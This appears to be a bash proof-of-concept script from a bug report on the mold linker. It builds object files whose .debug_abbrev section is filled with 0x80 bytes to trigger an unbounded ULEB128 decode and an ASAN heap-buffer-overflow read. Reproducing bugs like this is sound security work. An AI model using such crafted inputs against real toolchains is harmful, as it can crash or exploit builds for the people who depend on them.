#!/bin/bash
# Self-contained repro for the unbounded ULEB128 decode in read_uleb()
# (lib/lib.h), reached via mold's --gdb-index .debug_abbrev parser.
#
# read_uleb() has no length parameter and no bounds check; it consumes bytes
# for as long as the 0x80 continuation bit is set. With
# `--gdb-index --compress-debug-sections=zlib`, mold keeps the merged
# .debug_abbrev in a heap buffer of exactly sh_size bytes
# (CompressedSection: `new u8[sh_size]`), so a runaway ULEB run over corrupted
# abbrev bytes walks off that heap buffer -> ASAN heap-buffer-overflow READ,
# caught precisely at the buffer boundary (no page-alignment luck needed).
#
# Usage: run.sh /path/to/mold
set -u
MOLD="${1:?usage: run.sh /path/to/mold}"
MOLD="$(readlink -f "$MOLD")"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ulimit -c 0

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
cd "$WORK"
cp "$SCRIPT_DIR/test.c" "$SCRIPT_DIR/corrupt_uleb.py" .

CRT1=/usr/lib/x86_64-linux-gnu/crt1.o
CRTI=/usr/lib/x86_64-linux-gnu/crti.o
CRTN=/usr/lib/x86_64-linux-gnu/crtn.o
LIBDIR=/usr/lib/x86_64-linux-gnu
DYNLD=/lib64/ld-linux-x86-64.so.2

export ASAN_OPTIONS=detect_leaks=0

link() {  # $1 = object, $2 = output-tag
  "$MOLD" --gdb-index --compress-debug-sections=zlib -o "out_$2.exe" \
    "$CRT1" "$CRTI" "$1" -L"$LIBDIR" -lc "$CRTN" \
    --dynamic-linker "$DYNLD" -e main
}

report() {  # $1 = exit code, $2 = tag
  local code=$1
  if [ "$code" -eq 1 ] && [ -n "${ASAN_HIT:-}" ]; then
    echo "==> [$2] ASAN heap-buffer-overflow (unpatched read_uleb overrun)"
  elif [ "$code" -ge 128 ]; then
    echo "==> [$2] crashed with signal $((code-128)) (exit $code)"
  elif [ "$code" -eq 0 ]; then
    echo "==> [$2] mold exited 0 -- linked cleanly"
  else
    echo "==> [$2] mold exited $code (patched build: clean Fatal(), or rejected)"
  fi
}

echo "=== Compiling real.o (gcc -g -O0) ==="
gcc -c -g -O0 test.c -o real.o
readelf -S real.o | grep -iE "debug_abbrev|debug_info " || true

echo
echo "################################################################"
echo "# Baseline: unmodified real.o (expect exit 0, clean link)"
echo "################################################################"
link real.o baseline; report $? baseline

echo
echo "################################################################"
echo "# Case A: fill80 -- entire .debug_abbrev overwritten with 0x80"
echo "#   read_uleb over the abbrev table never sees a cleared"
echo "#   continuation bit and walks off the heap buffer end."
echo "################################################################"
python3 corrupt_uleb.py real.o evilA.o .debug_abbrev fill80
OUT=$(link evilA.o evilA 2>&1); CODE=$?
echo "$OUT" | head -35
echo "$OUT" | grep -q "heap-buffer-overflow" && ASAN_HIT=1
echo "--- mold exit: $CODE ---"; report $CODE evilA-fill80
unset ASAN_HIT

echo
echo "################################################################"
echo "# Case B (same class, different input): DWARF4 object, fill80."
echo "#   Different CU-header layout (CuHdrDwarf2_32 template) drives"
echo "#   the same find_cu_abbrev() read_uleb overrun -- shows the bug"
echo "#   is not specific to the default DWARF5 output."
echo "################################################################"
gcc -c -g -gdwarf-4 -O0 test.c -o real4.o
python3 corrupt_uleb.py real4.o evilB.o .debug_abbrev fill80
OUT=$(link evilB.o evilB 2>&1); CODE=$?
echo "$OUT" | head -12
echo "$OUT" | grep -q "heap-buffer-overflow" && ASAN_HIT=1
echo "--- mold exit: $CODE ---"; report $CODE evilB-dwarf4-fill80
unset ASAN_HIT

echo
echo "################################################################"
echo "# Informational: tail80 (last 8 bytes only) -- does NOT crash."
echo "#   find_cu_abbrev matches abbrev #1 at the start and never"
echo "#   walks to the tail, so a short tail run self-terminates.  A"
echo "#   runaway must reach the buffer end from where the decode"
echo "#   actually starts."
echo "################################################################"
python3 corrupt_uleb.py real.o evilC.o .debug_abbrev tail80 8
OUT=$(link evilC.o evilC 2>&1); CODE=$?
echo "$OUT" | grep -q "heap-buffer-overflow" && ASAN_HIT=1
echo "--- mold exit: $CODE ---"; report $CODE evilC-tail80
unset ASAN_HIT
